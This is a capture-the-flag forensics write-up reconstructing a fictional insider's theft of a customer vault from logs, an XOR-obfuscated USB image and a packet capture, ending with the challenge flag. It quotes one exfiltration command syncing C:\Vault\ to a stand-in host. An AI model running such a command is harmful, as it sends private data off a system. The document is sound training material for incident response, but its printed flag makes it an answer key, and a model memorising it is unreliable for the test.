---
title: "Operation Dark Crush"
ctf: "GPI CTF"
date: "2026-10-10"
category: "forensics"
difficulty: "Hard"
points: 150
flag_format: "GPI{<md5_hex_digest>}"
author: "bhaiya_ji"
---

# Operation Dark Crush

## Summary

The incident was reconstructed by correlating the cloud audit trail, Windows
artifacts, mobile backup, USB image, and packet capture.  The insider used
MEGASYNC to exfiltrate the customer vault to an internally resolved destination
while subsequently clearing logs and altering local timestamps.

## Solution

### 1. Establish the reliable timeline

The endpoint's later timestamps cannot be trusted: the Security log records
log-clearing activity followed by a twelve-minute clock adjustment.  The cloud
audit records and the original filesystem artifacts corroborate the earlier
time instead.

| Time (UTC) | Evidence | Event |
| --- | --- | --- |
| 07:07:32 | `cloud_audit_logs.json` | `cferguson` authenticated to cloud storage. |
| 07:32:xx | Cloud audit | The customer-vault bucket was enumerated. |
| 07:52:32 | Cloud audit, USN journal, RecentDocs, Prefetch | `vault.zip` was read and exfiltration began. |
| 08:00:xx | Windows Security log | Log-clearing command executed. |
| 08:04:xx | Windows Security log | Local time changed by +12 minutes. |

The cloud download record is the authoritative transfer record: it names
`customer-vault/vault.zip` and gives an exact size of `316669952` bytes.

### 2. Recover the data in the obfuscated artifacts

The USB image is XOR-obfuscated with `0x7a`.  Decoding it yields a tar archive;
the `.vault_sync/exfil_plan.enc` member is then XOR-obfuscated with `0x33` and
Base64 encoded.

```python
from pathlib import Path
import base64
import io
import tarfile

image = Path("evidence/usb/suspicious_usb.img").read_bytes()
archive = bytes(byte ^ 0x7A for byte in image)

with tarfile.open(fileobj=io.BytesIO(archive)) as tf:
    encrypted = tf.extractfile(".vault_sync/exfil_plan.enc").read()

plan = base64.b64decode(bytes(byte ^ 0x33 for byte in encrypted)).decode()
print(plan)
```

The recovered plan identifies the coordinator alias, transfer utility,
destination, and incident tracking identifier.  It also confirms that the
target was the customer vault rather than a decoy document.

The first TCP payload in the packet capture is XOR-obfuscated with `0x42`.
After decoding, its HTTP request contains the destination `Host` header, an
`X-Session-Auth` value that Base64-decodes to the case identifier, an
`X-Client-ID` value that identifies the MEGASYNC client, and a `Content-Length`
of `316669952`.  The remaining capture is only a partial opaque transfer, so
the cloud audit size and HTTP content length are the reliable size sources.

### 3. Correlate the fields for the master incident string

| Field | Recovered value | Supporting evidence |
| --- | --- | --- |
| Insider name | Christine Ferguson (`cferguson`) | Employee data and cloud-login audit event |
| Threat alias | EXFILKING | Decoded USB exfiltration plan and mobile evidence |
| Tool | MEGASYNC | Prefetch, PowerShell command, decoded plan, and packet header |
| Domain | CDN-LEDGER.INVALID | PowerShell command, decoded plan, DNS, and HTTP `Host` header |
| Date | 2026-09-28 | Corroborated cloud and endpoint activity |
| Time | 07:52:32 | Cloud download audit and artifact timestamps before tampering |
| Size | 302 MiB | `316669952 / 1024 / 1024` |
| Case ID | CASE-3714 | Decoded USB plan and Base64-decoded HTTP header |

The PowerShell history provides an additional endpoint-level confirmation of
the transfer command:

```text
MEGASYNC.exe sync C:\Vault\ CDN-LEDGER.INVALID:/leak
```

Build the master incident string with the exact challenge grammar:

```text
DARKLEDGER<INSIDERNAME><THREATALIAS><TOOL><DOMAIN><DATE><TIME><SIZE>_<CASE_ID>
```

Use the normalized values above, with no separators other than the required
underscore before the case ID, and calculate the MD5 digest of the resulting
UTF-8 byte string:

```python
import hashlib

digest = hashlib.md5(master_incident_string.encode("utf-8")).hexdigest()
```

## Submission

GPI{6134b1d0179fc89c2e8ec8105fa29a0e}

